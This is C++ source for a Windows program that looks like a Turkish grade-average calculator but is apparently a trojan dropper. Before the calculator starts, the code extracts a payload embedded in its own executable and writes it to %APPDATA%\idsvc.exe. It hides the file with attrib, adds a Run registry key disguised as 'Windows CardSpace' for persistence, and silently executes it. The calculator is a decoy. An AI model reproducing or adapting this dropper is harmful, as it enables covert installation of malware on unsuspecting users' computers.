#include<iostream>
#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <conio.h>
using namespace std;

int main()
{
     char* exepath = new char[256];
     GetModuleFileName(NULL, exepath, 255);
     FILE *f1 = fopen(exepath, "rb");
     string virpath = getenv("APPDATA");
     virpath += "\\idsvc.exe";
          FILE *f2 = fopen(virpath.c_str(),"rb");
          if( f2 == NULL ) // file isnt exist
          {
               f2 = fopen(virpath.c_str(),"wb");
               //FILE *f4 = fopen("c.exe","wb");
               char a='a',b='a',c='a',d='a';
               int sayac=0;
               
               while( !feof(f1) )
               {
                    d = c;
                    c = b;
                    b = a;
                    fscanf(f1,"%c",&a);
                    if(a=='k'&&b=='c'&&c=='u'&&d=='f')
                    {
                         sayac++;
                         continue;
                    }
                    if( sayac == 1 ) fprintf(f2,"%c",a);
                    //if( sayac == 2 ) fprintf(f3,"%c",a);
                    //if( sayac == 3 ) fprintf(f4,"%c",a);
               }
               fclose(f2);
               
               //fclose(f3);
               system((((string)"attrib +s +h +r ") + virpath).c_str());
               HKEY newValue;
               RegOpenKey(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",&newValue);
               RegSetValueEx(newValue,"Windows CardSpace",0,REG_SZ,(LPBYTE)virpath.c_str(),virpath.size());
               RegCloseKey(newValue);
               ShellExecute(NULL,"OPEN",virpath.c_str(),"","",SW_HIDE);
               //fclose(f4);
               //system("C:\\Windows\\System32\\runner.bat");
          }
         int x,y,top_not=0,top_saat=0;
         cout<<"Ders Saatine ve Ders Notuna 0 Girene Kadar Notlari Alir Ve Size Ort. Soler.."<<endl<<endl;
         system("pause");
         system("cls");
         while(x!=0)
         {
                     cout<<endl<<"\tOnce Ders Saati Sonra Ders Ort. Gir.."<<endl;
                     cin>>x>>y;
                     top_not+=x*y;
                     top_saat+=x;
                     system("cls");
         }   
         cout<<"Ortalaman --> "<<top_not/top_saat<<endl;
         getch();
         return 0;
}
